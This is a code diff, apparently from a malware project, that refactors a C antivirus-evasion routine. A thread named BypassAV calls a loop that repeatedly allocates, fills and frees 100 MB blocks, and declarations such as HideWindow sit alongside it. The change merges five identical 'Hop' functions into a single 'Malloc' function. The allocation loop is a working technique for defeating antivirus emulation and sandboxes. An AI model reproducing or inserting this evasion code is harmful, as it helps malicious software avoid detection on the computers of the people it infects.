@@ -4,12 +4,7 @@
 DWORD WINAPI BypassAV(LPVOID);
 void HideWindow();
 void Bunny();
-void Hop1();
-void Hop2();
-void Hop3();
-void Hop4();
-void Hop5();
-
+void Malloc();
 
 DWORD WINAPI BypassAV(LPVOID params){
 	Bunny();
@@ -39,8 +34,6 @@ DWORD WINAPI BypassAV(LPVOID params){
 	return true;
 }
 
-
-
 void Bunny(){
 
 	double Max = 9999999;
@@ -51,13 +44,10 @@ void Bunny(){
 
 
 	for(int i = 0; i < 8; i++){
-		Hop1();
-		Hop2();
-		Hop3();
-		Hop4();
+		Malloc();
 		Start:;
 		i++;
-		Hop5();
+		Malloc();
 		if((i % 3) == 0){
 			goto Start;	
 		}
@@ -66,9 +56,7 @@ void Bunny(){
 
 }
 
-
-
-void Hop1(){
+void Malloc(){
 
 	char * Memdmp = NULL;
 	Memdmp = (char *)malloc(100000000);
@@ -77,45 +65,3 @@ void Hop1(){
 		free(Memdmp);
 	}
 }
-void Hop2(){
-
-
-	char * Memdmp = NULL;
-	Memdmp = (char *)malloc(100000000);
-	if(Memdmp != NULL){
-		memset(Memdmp, 00, 100000000);
-		free(Memdmp);
-	}
-}
-void Hop3(){
-
-
-	char * Memdmp = NULL;
-	Memdmp = (char *)malloc(100000000);
-	if(Memdmp != NULL){
-		memset(Memdmp, 00, 100000000);
-		free(Memdmp);
-	}
-}
-void Hop4(){
-
-	char * Memdmp = NULL;
-	Memdmp = (char *)malloc(100000000);
-	if(Memdmp != NULL){
-		memset(Memdmp, 00, 100000000);
-		free(Memdmp);
-	}
-}
-void Hop5(){
-
-
-
-	char * Memdmp = NULL;
-	Memdmp = (char *)malloc(100000000);
-	if(Memdmp != NULL){
-		memset(Memdmp, 00, 100000000);
-		free(Memdmp);
-	}
-}
-
-
